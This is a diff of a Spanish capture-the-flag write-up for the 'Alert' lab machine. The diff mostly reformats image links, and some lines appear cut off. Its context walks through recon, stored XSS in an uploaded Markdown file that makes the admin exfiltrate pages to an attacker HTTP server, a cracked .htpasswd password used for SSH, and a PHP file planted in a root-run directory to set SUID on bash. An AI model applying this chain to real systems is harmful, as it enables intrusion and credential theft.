@@ -13,15 +13,15 @@ Iniciamos con un escaneo de puertos abiertos utilizando nmap:
 nmap -p- --open -T5 -n -Pn -vvv 10.129.63.24 -oG targeted
 ```
 
-![[imgs 1/Pasted image 20260828122522.png]]
+![Pasted image 20260828122522](imgs%201/Pasted%20image%2020260828122522.png)
 
-El escaneo muestra que los puertos 22 (SSH) y 80 (HTTP) están abiertos. Al detectar un servicio web, lanzamos un escaneo sobre el puerto 80 para identificar la versión y lanzar scripts básicos con -sC
+El escaneo muestra que los puertos 22 (SSH) y 80 (HTTP) están abiertos. Al detectar un servicio web, lanzamos un escaneo sobre el puerto 80 para identificar la versión y lanzar scripts básicos [...]
 
 ```bash
 nmap -p80 -sCV 10.129.63.24 -oN service
 ```
 
-![[imgs 1/Pasted image 20260828122746.png]]
+![Pasted image 20260828122746](imgs%201/Pasted%20image%2020260828122746.png)
 
 Identificamos un servidor Apache 2.4.41. Buscando esta versión exacta en Launchpad, muestra que el sistema operativo es Ubuntu Focal.
 
@@ -33,19 +33,19 @@ nmap --script http-enum -p80 10.129.63.24 -oN targeted
 gobuster dir -u http://10.129.63.24 -w /usr/share/wordlists/dirb/common.txt
 ```
 
-![[imgs 1/gobuster_alert.png]]
+![gobuster_alert](imgs%201/gobuster_alert.png)
 
 Añadimos el dominio `alert.htb` a nuestro `/etc/hosts` y accedemos a la web. Encontramos un visor de archivos Markdown.
 
-![[imgs 1/markdown_viewer.png]]
+![markdown_viewer](imgs%201/markdown_viewer.png)
 
 Gobuster revela el directorio `messages.php`. Al intentar acceder, recibimos un error 403 Forbidden, lo que indica que está restringido, probablemente para uso exclusivo del administrador.
 
-![[imgs 1/messages_php.png]]
+![messages_php](imgs%201/messages_php.png)
 
 ## 2. Explotación (XSS a LFI/Lectura de Archivos)
 
-La web permite subir archivos `.md`. Esto es un vector clásico para ataques de Cross-Site Scripting (XSS) si el renderizador no sanitiza correctamente las etiquetas HTML. Subimos un payload básico para comprobarlo:
+La web permite subir archivos `.md`. Esto es un vector clásico para ataques de Cross-Site Scripting (XSS) si el renderizador no sanitiza correctamente las etiquetas HTML. Subimos un payload bási[...]
 
 ```markdown
 <script>
@@ -55,10 +55,10 @@ La web permite subir archivos `.md`. Esto es un vector clásico para ataques de 
 
 Al visualizar el archivo subido, el script se ejecuta, confirmando la vulnerabilidad.
 
-![[imgs 1/alert_htb.png]]
+![alert_htb](imgs%201/alert_htb.png)
 
   
-Al hacer clic en "Share Markdown", la aplicación genera una URL con nuestro archivo cifrado. En la sección "Contact us", se nos indica que cualquier enlace enviado será revisado directamente por el administrador. Entonces se lo enviamos al administrador y al abrir el mensaje, se ejecutará cualquier código JS que inyectemos al abrir nuestro enlace.
+Al hacer clic en "Share Markdown", la aplicación genera una URL con nuestro archivo cifrado. En la sección "Contact us", se nos indica que cualquier enlace enviado será revisado directamente po[...]
 
 Aprovecharemos este XSS para forzar al administrador a leer la página restringida `messages.php` y enviarnos su contenido.
 
@@ -88,11 +88,11 @@ python3 -m http.server 80
 
 Subimos `test.md`, copiamos el enlace generado en "Share Markdown" y lo enviamos a través del formulario "Contact us".
 
-![[imgs 1/flujo_obtener_html.png]]
+![flujo_obtener_html](imgs%201/flujo_obtener_html.png)
 
 En nuestro servidor Python, recibimos una petición GET con el contenido de `messages.php` codificado en Base64.
 
-![[imgs 1/registro_admin.png]]
+![registro_admin](imgs%201/registro_admin.png)
 
 Decodificamos el string recibido:
 
@@ -100,7 +100,7 @@ Decodificamos el string recibido:
 echo -n "<BASE64_RECIBIDO>" | base64 -d
 ```
 
-El contenido exfiltrado revela un archivo de contraseñas de Apache en la ruta `/var/www/statistics.alert.htb/.htpasswd`. Repetimos el ataque modificando el archivo `pwn.js` para que el administrador haga una petición GET a esa ruta específica en lugar de `messages.php`.
+El contenido exfiltrado revela un archivo de contraseñas de Apache en la ruta `/var/www/statistics.alert.htb/.htpasswd`. Repetimos el ataque modificando el archivo `pwn.js` para que el administr[...]
 
 Obtenemos el siguiente hash:
 
@@ -123,7 +123,7 @@ ssh albert@10.129.63.24
 # Password: manchesterunited
 ```
 
-Revisamos los servicios internos a la escucha utilizando `ss -nltp` y detectamos el puerto 8080 abierto localmente. Realizamos un reenvío de puertos (Local Port Forwarding) para interactuar con él desde nuestra máquina:
+Revisamos los servicios internos a la escucha utilizando `ss -nltp` y detectamos el puerto 8080 abierto localmente. Realizamos un reenvío de puertos (Local Port Forwarding) para interactuar con [...]
 
 ```bash
 ssh albert@10.129.63.24 -L 8080:127.0.0.1:8080
@@ -135,7 +135,7 @@ Verificamos los grupos a los que pertenece el usuario `albert` con el comando `i
 find / -group management 2>/dev/null
 ```
 
-Localizamos el directorio `/var/www/website-monitor/monitors`. Un `ls -l` revela que tenemos permisos de escritura en este directorio, cuyos archivos son ejecutados por `root` a través del servicio web interno en el puerto 8080.
+Localizamos el directorio `/var/www/website-monitor/monitors`. Un `ls -l` revela que tenemos permisos de escritura en este directorio, cuyos archivos son ejecutados por `root` a través del servi[...]
 
 Para escalar privilegios, creamos un script en PHP (`test.php`) que asigne permisos SUID al binario de bash:
 
@@ -145,7 +145,7 @@ Para escalar privilegios, creamos un script en PHP (`test.php`) que asigne permi
 ?>
 ```
 
-Como el puerto 8080 expone el contenido de `website-monitor`, navegamos o hacemos un `curl` a http://127.0.0.1:8080/monitors/test.php. El servidor ejecuta nuestro código como `root`, estableciendo el bit SUID en `/bin/bash`.
+Como el puerto 8080 expone el contenido de `website-monitor`, navegamos o hacemos un `curl` a http://127.0.0.1:8080/monitors/test.php. El servidor ejecuta nuestro código como `root`, establecien[...]
 
 Finalmente, lanzamos una bash privilegiada y leemos la flag de root:
 
